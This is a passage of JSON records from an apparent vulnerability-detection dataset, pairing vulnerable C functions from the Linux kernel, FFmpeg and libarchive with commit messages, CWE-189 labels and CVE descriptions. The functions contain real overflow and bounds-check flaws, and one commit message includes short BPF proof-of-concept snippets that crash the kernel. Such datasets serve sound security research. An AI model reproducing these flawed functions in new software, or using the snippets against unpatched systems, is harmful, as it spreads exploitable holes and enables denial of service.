pagetable and swap space use.\n\t */\n\tpoints = get_mm_rss(p->mm) + p->mm->nr_ptes;\n\tpoints += get_mm_counter(p->mm, MM_SWAPENTS);\n\n\tpoints *= 1000;\n\tpoints /= totalpages;\n\ttask_unlock(p);\n\n\t/*\n\t * Root processes get 3% bonus, just like the __vm_enough_memory()\n\t * implementation used by LSMs.\n\t */\n\tif (has_capability_noaudit(p, CAP_SYS_ADMIN))\n\t\tpoints -= 30;\n\n\t/*\n\t * /proc/pid/oom_score_adj ranges from -1000 to +1000 such that it may\n\t * either completely disable oom killing or always prefer a certain\n\t * task.\n\t */\n\tpoints += p->signal->oom_score_adj;\n\n\t/*\n\t * Never return 0 for an eligible task that may be killed since it's\n\t * possible that no single user task uses more than 0.1% of memory and\n\t * no single admin tasks uses more than 3.0%.\n\t */\n\tif (points <= 0)\n\t\treturn 1;\n\treturn (points < 1000) ? points : 1000;\n}\n", "func_hash": 321295227204559210817209603409376127665, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-4097", "cve_desc": "Integer overflow in the oom_badness function in mm/oom_kill.c in the Linux kernel before 3.1.8 on 64-bit platforms allows local users to cause a denial of service (memory consumption or process termination) by using a certain large amount of memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4097"}
{"idx": 903, "project": "FFmpeg", "commit_id": "86736f59d6a527d8bc807d09b93f971c0fe0bb07", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/86736f59d6a527d8bc807d09b93f971c0fe0bb07", "commit_message": "avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": " static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n    }\n    for (; i < w; i++)\n        dst[i] = src1[i] + src2[i];\n}\n", "func_hash": 13327716502808838951480419970082341279, "file_name": "pngdsp.c", "file_hash": 272561586882969761489476663217965027988, "cwe": ["CWE-189"], "cve": "CVE-2013-7014", "cve_desc": "Integer signedness error in the add_bytes_l2_c function in libavcodec/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7014"}
{"idx": 917, "project": "linux", "commit_id": "a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "commit_message": "libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be\nsure the user passes us a NUL terminated string so I've added a\nterminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nAcked-by: Dan Williams <dcbw@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>", "target": 1, "func": "static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n\t\t\t    size_t cnt, loff_t *ppos)\n{\n\tint r, i;\n\tchar *pdata;\n\tchar *p;\n\tchar *p0;\n\tchar *p1;\n \tchar *p2;\n \tstruct debug_data *d = f->private_data;\n \n\tpdata = kmalloc(cnt, GFP_KERNEL);\n \tif (pdata == NULL)\n \t\treturn 0;\n \n\tif (copy_from_user(pdata, buf, cnt)) {\n\t\tlbs_deb_debugfs(\"Copy from user failed\\n\");\n \t\tkfree(pdata);\n \t\treturn 0;\n \t}\n \n \tp0 = pdata;\n \tfor (i = 0; i < num_of_items; i++) {\n\t\tdo {\n\t\t\tp = strstr(p0, d[i].name);\n\t\t\tif (p == NULL)\n\t\t\t\tbreak;\n\t\t\tp1 = strchr(p, '\\n');\n\t\t\tif (p1 == NULL)\n\t\t\t\tbreak;\n\t\t\tp0 = p1++;\n\t\t\tp2 = strchr(p, '=');\n\t\t\tif (!p2)\n\t\t\t\tbreak;\n\t\t\tp2++;\n\t\t\tr = simple_strtoul(p2, NULL, 0);\n\t\t\tif (d[i].size == 1)\n\t\t\t\t*((u8 *) d[i].addr) = (u8) r;\n\t\t\telse if (d[i].size == 2)\n\t\t\t\t*((u16 *) d[i].addr) = (u16) r;\n\t\t\telse if (d[i].size == 4)\n\t\t\t\t*((u32 *) d[i].addr) = (u32) r;\n\t\t\telse if (d[i].size == 8)\n\t\t\t\t*((u64 *) d[i].addr) = (u64) r;\n\t\t\tbreak;\n\t\t} while (1);\n\t}\n\tkfree(pdata);\n\n\treturn (ssize_t)cnt;\n}\n", "func_hash": 75946839779695435397940604468788358223, "file_name": "debugfs.c", "file_hash": 106884417614616090268549746071704839322, "cwe": ["CWE-189"], "cve": "CVE-2013-6378", "cve_desc": "The lbs_debugfs_write function in drivers/net/wireless/libertas/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6378"}
{"idx": 918, "project": "linux", "commit_id": "17d68b763f09a9ce824ae23eb62c9efc57b69271", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/17d68b763f09a9ce824ae23eb62c9efc57b69271", "commit_message": "KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>", "target": 1, "func": " static void recalculate_apic_map(struct kvm *kvm)\n {\n \tstruct kvm_apic_map *new, *old = NULL;\n\tstruct kvm_vcpu *vcpu;\n\tint i;\n\n\tnew = kzalloc(sizeof(struct kvm_apic_map), GFP_KERNEL);\n\n\tmutex_lock(&kvm->arch.apic_map_lock);\n\n\tif (!new)\n\t\tgoto out;\n\n\tnew->ldr_bits = 8;\n\t/* flat mode is default */\n\tnew->cid_shift = 8;\n\tnew->cid_mask = 0;\n\tnew->lid_mask = 0xff;\n\n\tkvm_for_each_vcpu(i, vcpu, kvm) {\n\t\tstruct kvm_lapic *apic = vcpu->arch.apic;\n\t\tu16 cid, lid;\n\t\tu32 ldr;\n\n\t\tif (!kvm_apic_present(vcpu))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * All APICs have to be configured in the same mode by an OS.\n\t\t * We take advatage of this while building logical id loockup\n\t\t * table. After reset APICs are in xapic/flat mode, so if we\n\t\t * find apic with different setting we assume this is the mode\n\t\t * OS wants all apics to be in; build lookup table accordingly.\n\t\t */\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n\t\t\tnew->cid_mask = new->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask /* flat mode */ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n\t\t\tnew->cid_shift = 4;\n\t\t\tnew->cid_mask = 0xf;\n\t\t\tnew->lid_mask = 0xf;\n\t\t}\n\n\t\tnew->phys_map[kvm_apic_id(apic)] = apic;\n\n\t\tldr = kvm_apic_get_reg(apic, APIC_LDR);\n\t\tcid = apic_cluster_id(new, ldr);\n\t\tlid = apic_logical_id(new, ldr);\n\n\t\tif (lid)\n\t\t\tnew->logical_map[cid][ffs(lid) - 1] = apic;\n\t}\nout:\n\told = rcu_dereference_protected(kvm->arch.apic_map,\n\t\t\tlockdep_is_held(&kvm->arch.apic_map_lock));\n\trcu_assign_pointer(kvm->arch.apic_map, new);\n\tmutex_unlock(&kvm->arch.apic_map_lock);\n\n\tif (old)\n\t\tkfree_rcu(old, rcu);\n\n\tkvm_vcpu_request_scan_ioapic(kvm);\n}\n", "func_hash": 90650423270339167732341881575553005428, "file_name": "lapic.c", "file_hash": 190243646842195855347072321834317558342, "cwe": ["CWE-189"], "cve": "CVE-2013-6376", "cve_desc": "The recalculate_apic_map function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (host OS crash) via a crafted ICR write operation in x2apic mode.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6376"}
{"idx": 933, "project": "linux", "commit_id": "0e033e04c2678dbbe74a46b23fffb7bb918c288e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/0e033e04c2678dbbe74a46b23fffb7bb918c288e", "commit_message": "ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp\nfragmentation for tunnel traffic.\") changed the calculation if\nthere is enough space to include a fragment header in the skb from a\nskb->mac_header dervived one to skb_headroom. Because we already peeled\noff the skb to transport_header this is wrong. Change this back to check\nif we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which\nskb_gso_segments the skb. The offsets get negative and we panic in memcpy\nbecause the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com>\nCc: Pravin B Shelar <pshelar@nicira.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n\t\t\t\t\t netdev_features_t features)\n{\n\tstruct sk_buff *segs = ERR_PTR(-EINVAL);\n\tunsigned int mss;\n\tunsigned int unfrag_ip6hlen, unfrag_len;\n\tstruct frag_hdr *fptr;\n\tu8 *packet_start, *prevhdr;\n\tu8 nexthdr;\n\tu8 frag_hdr_sz = sizeof(struct frag_hdr);\n\tint offset;\n\t__wsum csum;\n\tint tnl_hlen;\n\n\tmss = skb_shinfo(skb)->gso_size;\n\tif (unlikely(skb->len <= mss))\n\t\tgoto out;\n\n\tif (skb_gso_ok(skb, features | NETIF_F_GSO_ROBUST)) {\n\t\t/* Packet is from an untrusted source, reset gso_segs. */\n\t\tint type = skb_shinfo(skb)->gso_type;\n\n\t\tif (unlikely(type & ~(SKB_GSO_UDP |\n\t\t\t\t      SKB_GSO_DODGY |\n\t\t\t\t      SKB_GSO_UDP_TUNNEL |\n\t\t\t\t      SKB_GSO_GRE |\n\t\t\t\t      SKB_GSO_IPIP |\n\t\t\t\t      SKB_GSO_SIT |\n\t\t\t\t      SKB_GSO_MPLS) ||\n\t\t\t     !(type & (SKB_GSO_UDP))))\n\t\t\tgoto out;\n\n\t\tskb_shinfo(skb)->gso_segs = DIV_ROUND_UP(skb->len, mss);\n\n\t\tsegs = NULL;\n\t\tgoto out;\n\t}\n\n\tif (skb->encapsulation && skb_shinfo(skb)->gso_type & SKB_GSO_UDP_TUNNEL)\n\t\tsegs = skb_udp_tunnel_segment(skb, features);\n\telse {\n\t\t/* Do software UFO. Complete and fill in the UDP checksum as HW cannot\n\t\t * do checksum of UDP packets sent as multiple IP fragments.\n\t\t */\n\t\toffset = skb_checksum_start_offset(skb);\n\t\tcsum = skb_checksum(skb, offset, skb->len - offset, 0);\n\t\toffset += skb->csum_offset;\n\t\t*(__sum16 *)(skb->data + offset) = csum_fold(csum);\n\t\tskb->ip_summed = CHECKSUM_NONE;\n \n \t\t/* Check if there is enough headroom to insert fragment header. */\n \t\ttnl_hlen = skb_tnl_header_len(skb);\n\t\tif (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {\n \t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n \t\t\t\tgoto out;\n \t\t}\n\n\t\t/* Find the unfragmentable header and shift it left by frag_hdr_sz\n\t\t * bytes to insert fragment header.\n\t\t */\n\t\tunfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);\n\t\tnexthdr = *prevhdr;\n\t\t*prevhdr = NEXTHDR_FRAGMENT;\n\t\tunfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +\n\t\t\t     unfrag_ip6hlen + tnl_hlen;\n\t\tpacket_start = (u8 *) skb->head + SKB_GSO_CB(skb)->mac_offset;\n\t\tmemmove(packet_start-frag_hdr_sz, packet_start, unfrag_len);\n\n\t\tSKB_GSO_CB(skb)->mac_offset -= frag_hdr_sz;\n\t\tskb->mac_header -= frag_hdr_sz;\n\t\tskb->network_header -= frag_hdr_sz;\n\n\t\tfptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);\n\t\tfptr->nexthdr = nexthdr;\n\t\tfptr->reserved = 0;\n\t\tipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));\n\n\t\t/* Fragment the skb. ipv6 header and the remaining fields of the\n\t\t * fragment header are updated in ipv6_gso_segment()\n\t\t */\n\t\tsegs = skb_segment(skb, features);\n\t}\n\nout:\n\treturn segs;\n}\n", "func_hash": 168959719558504354311532021332122220778, "file_name": "udp_offload.c", "file_hash": 333651348407875619543893139783756554855, "cwe": ["CWE-189"], "cve": "CVE-2013-4563", "cve_desc": "The udp6_ufo_fragment function in net/ipv6/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4563"}
{"idx": 956, "project": "linux", "commit_id": "6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "commit_message": "ipc,sem: fine grained locking for semtimedop\n\nIntroduce finer grained locking for semtimedop, to handle the common case\nof a program wanting to manipulate one semaphore from an array with\nmultiple semaphores.\n\nIf the call is a semop manipulating just one semaphore in an array with\nmultiple semaphores, only take the lock for that semaphore itself.\n\nIf the call needs to manipulate multiple semaphores, or another caller is\nin a transaction that manipulates multiple semaphores, the sem_array lock\nis taken, as well as all the locks for the individual semaphores.\n\nOn a 24 CPU system, performance numbers with the semop-multi\ntest with N threads and N semaphores, look like this:\n\n\tvanilla\t\tDavidlohr's\tDavidlohr's +\tDavidlohr's +\nthreads\t\t\tpatches\t\trwlock patches\tv3 patches\n10\t610652\t\t726325\t\t1783589\t\t2142206\n20\t341570\t\t365699\t\t1520453\t\t1977878\n30\t288102\t\t307037\t\t1498167\t\t2037995\n40\t290714\t\t305955\t\t1612665\t\t2256484\n50\t288620\t\t312890\t\t1733453\t\t2650292\n60\t289987\t\t306043\t\t1649360\t\t2388008\n70\t291298\t\t306347\t\t1723167\t\t2717486\n80\t290948\t\t305662\t\t1729545\t\t2763582\n90\t290996\t\t306680\t\t1736021\t\t2757524\n100\t292243\t\t306700\t\t1773700\t\t3059159\n\n[davidlohr.bueso@hp.com: do not call sem_lock when bogus sma]\n[davidlohr.bueso@hp.com: make refcounter atomic]\nSigned-off-by: Rik van Riel <riel@redhat.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Davidlohr Bueso <davidlohr.bueso@hp.com>\nCc: Chegu Vinod <chegu_vinod@hp.com>\nCc: Jason Low <jason.low2@hp.com>\nReviewed-by: Michel Lespinasse <walken@google.com>\nCc: Peter Hurley <peter@hurleysoftware.com>\nCc: Stanislav Kinsbursky <skinsbursky@parallels.com>\nTested-by: Emmanuel Benisty <benisty.e@gmail.com>\nTested-by: Sedat Dilek <sedat.dilek@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": " void ipc_rcu_putref(void *ptr)\n {\n\tif (--container_of(ptr, struct ipc_rcu_hdr, data)->refcount > 0)\n \t\treturn;\n \n \tif (container_of(ptr, struct ipc_rcu_hdr, data)->is_vmalloc) {\n\t\tcall_rcu(&container_of(ptr, struct ipc_rcu_grace, data)->rcu,\n\t\t\t\tipc_schedule_free);\n\t} else {\n\t\tkfree_rcu(container_of(ptr, struct ipc_rcu_grace, data), rcu);\n\t}\n}\n", "func_hash": 147913652096999237317585629480667799082, "file_name": "util.c", "file_hash": 17292951975649306151149884108411535204, "cwe": ["CWE-189"], "cve": "CVE-2013-4483", "cve_desc": "The ipc_rcu_putref function in ipc/util.c in the Linux kernel before 3.10 does not properly manage a reference count, which allows local users to cause a denial of service (memory consumption or system crash) via a crafted application.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4483"}
{"idx": 978, "project": "linux", "commit_id": "1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "commit_message": "cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed\nthe code such that the vol->prepath no longer contained a leading\ndelimiter and then fixed up the places that accessed that field to\naccount for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the\npointer addition on pos, that patch failed to account for the fact that\nwe had already incremented \"pos\" by one when adding the length of the\nprepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of \"pos\".\n\nCc: <stable@vger.kernel.org> # v3.8+\nReported-by: Marcus Moeller <marcus.moeller@gmx.ch>\nReported-by: Ken Fallon <ken.fallon@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 1, "func": "build_unc_path_to_root(const struct smb_vol *vol,\n\t\tconst struct cifs_sb_info *cifs_sb)\n{\n\tchar *full_path, *pos;\n\tunsigned int pplen = vol->prepath ? strlen(vol->prepath) + 1 : 0;\n\tunsigned int unc_len = strnlen(vol->UNC, MAX_TREE_SIZE + 1);\n\n\tfull_path = kmalloc(unc_len + pplen + 1, GFP_KERNEL);\n\tif (full_path == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tstrncpy(full_path, vol->UNC, unc_len);\n \tpos = full_path + unc_len;\n \n \tif (pplen) {\n\t\t*pos++ = CIFS_DIR_SEP(cifs_sb);\n\t\tstrncpy(pos, vol->prepath, pplen);\n \t\tpos += pplen;\n \t}\n \n\t*pos = '\\0'; /* add trailing null */\n\tconvert_delimiter(full_path, CIFS_DIR_SEP(cifs_sb));\n\tcifs_dbg(FYI, \"%s: full_path=%s\\n\", __func__, full_path);\n\treturn full_path;\n}\n", "func_hash": 8340581254640439328367740409140108158, "file_name": "connect.c", "file_hash": 127914316993594912069322439230391628902, "cwe": ["CWE-189"], "cve": "CVE-2013-4247", "cve_desc": "Off-by-one error in the build_unc_path_to_root function in fs/cifs/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4247"}
{"idx": 1022, "project": "linux", "commit_id": "fc9bbca8f650e5f738af8806317c0a041a48ae4a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/fc9bbca8f650e5f738af8806317c0a041a48ae4a", "commit_message": "vm: convert fb_mmap to vm_iomap_memory() helper\n\nThis is my example conversion of a few existing mmap users.  The\nfb_mmap() case is a good example because it is a bit more complicated\nthan some: fb_mmap() mmaps one of two different memory areas depending\non the page offset of the mmap (but happily there is never any mixing of\nthe two, so the helper function still works).\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "fb_mmap(struct file *file, struct vm_area_struct * vma)\n {\n \tstruct fb_info *info = file_fb_info(file);\n \tstruct fb_ops *fb;\n\tunsigned long off;\n \tunsigned long start;\n \tu32 len;\n \n \tif (!info)\n \t\treturn -ENODEV;\n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))\n\t\treturn -EINVAL;\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n \tfb = info->fbops;\n \tif (!fb)\n \t\treturn -ENODEV;\n\tmutex_lock(&info->mm_lock);\n\tif (fb->fb_mmap) {\n\t\tint res;\n\t\tres = fb->fb_mmap(info, vma);\n\t\tmutex_unlock(&info->mm_lock);\n \t\treturn res;\n \t}\n \n\t/* frame buffer memory */\n \tstart = info->fix.smem_start;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);\n\tif (off >= len) {\n\t\t/* memory mapped io */\n\t\toff -= len;\n\t\tif (info->var.accel_flags) {\n\t\t\tmutex_unlock(&info->mm_lock);\n\t\t\treturn -EINVAL;\n\t\t}\n \t\tstart = info->fix.mmio_start;\n\t\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);\n \t}\n \tmutex_unlock(&info->mm_lock);\n\tstart &= PAGE_MASK;\n\tif ((vma->vm_end - vma->vm_start + off) > len)\n\t\treturn -EINVAL;\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n\t/* VM_IO | VM_DONTEXPAND | VM_DONTDUMP are set by io_remap_pfn_range()*/\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n\tfb_pgprotect(file, vma, off);\n\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t     vma->vm_end - vma->vm_start, vma->vm_page_prot))\n\t\treturn -EAGAIN;\n\treturn 0;\n }\n", "func_hash": 61607845425516357035166702793045732353, "file_name": "fbmem.c", "file_hash": 127339374413477725415479961267942032480, "cwe": ["CWE-189"], "cve": "CVE-2013-2596", "cve_desc": "Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2596"}
{"idx": 1123, "project": "libarchive", "commit_id": "22531545514043e04633e1c015c7540b9de9dbe4", "project_url": "https://github.com/libarchive/libarchive", "commit_url": "https://github.com/libarchive/libarchive/commit/22531545514043e04633e1c015c7540b9de9dbe4", "commit_message": "Limit write requests to at most INT_MAX.\nThis prevents a certain common programming error (passing -1 to write)\nfrom leading to other problems deeper in the library.", "target": 1, "func": " _archive_write_data(struct archive *_a, const void *buff, size_t s)\n {\n \tstruct archive_write *a = (struct archive_write *)_a;\n \tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n \t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n \tarchive_clear_error(&a->archive);\n \treturn ((a->format_write_data)(a, buff, s));\n }\n", "func_hash": 130653882621145290070878332961230320693, "file_name": "archive_write.c", "file_hash": 270035346370556242064860481699848677907, "cwe": ["CWE-189"], "cve": "CVE-2013-0211", "cve_desc": "Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-0211"}
{"idx": 1303, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr *nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n\tif (nla->nla_len > A - skb->len)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 282497948287924023009519278415408669688, "file_name": "filter.c", "file_hash": 228552301451129948726370568954536416607, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 9271, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr 